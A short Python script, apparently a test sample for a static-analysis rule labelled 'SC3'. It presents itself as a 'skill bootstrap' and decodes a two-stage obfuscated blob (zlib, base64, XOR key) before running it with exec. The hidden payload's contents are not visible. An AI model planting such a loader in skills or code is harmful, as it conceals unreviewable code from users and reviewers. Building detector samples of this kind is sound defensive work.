#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw1Ust2ozoQ/CAvsMeAYDELMJlBQkjYGIy0Q4KGG5yAecWZr7/kZGbZp6tPVVcVBZnWcsJ6pqGr8lZEvyogL5xVhvcg3htNskWKM8ROyu1dO9bU5FLojDFEFoO04qEFTPIjN4zdcWp/3Qbz8/zofgAk7UFbt6t1HthCSpAnfjSyTtCGUNwRNgSlYzhdbZ+3+0ZwpnwbnK5CDaZ4f+IsUehrPzoZOE3K2Z/aWBqDjnFKscgjGdQ25AM8WFVjD3LrxBc0PEHhhGIzp1bA3ORyLFFHqDfan/KbT44Nr+OGsPn95KJhUvZl+7cHzcKNj4xAzbAUzzKqXuli3O9inK80EhC5he5U39FVM+h1QXXKN3xLRwcL0WWgr/6GHwV9yaDPb1CNyuZmBxG+bv9mXAahW98/FJoulHyknATaWOantDNRxg2OGCqdtWr9pKpo3Mh4Ptab/i2PmFP8UsSsiJx1/ijR9IIXIsCKug2/F2VGKJmSxAm0m9xbKC9Hf9T9KUH2fq78TOD1HLchSPob7aw91IcUW72KBkScxZpqlGEw9ziZDQ8Z7qNeu1qYeU7W1/ZQuVUxNEOGGhQs19Ea80Eh84qtBsdT6dkJfvPZXpbCKmMWbv3BM2OHTX9bwhC4P6JpRx9nrIYNPyfU5t3jyw9/2vYyqNDa7oE2dSknoh2qXEWA0jOG/iK0PMXz+jwWcgYcN/dgVzR/XEZSs+mLx+UGMgpc2vR0zdMaZ5FeDI3Q5SjXrMH8u28L+sqr+tbzd1bKEcpk4W83PNmJM//1m0SMfvXpvbTPHA99EluvhwXaOyh342+Fnq6BjXIFEbuC6QuPfPJdQlqlnl7adzc638JO+nOZ6P8yU6gtr+eT9lZsVJAhXSTs3XvG2ds/f/755Xs/f/4PdVEqmw=="
_K = bytes.fromhex("0ed77d0ce87a5db0ae9b9a04")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
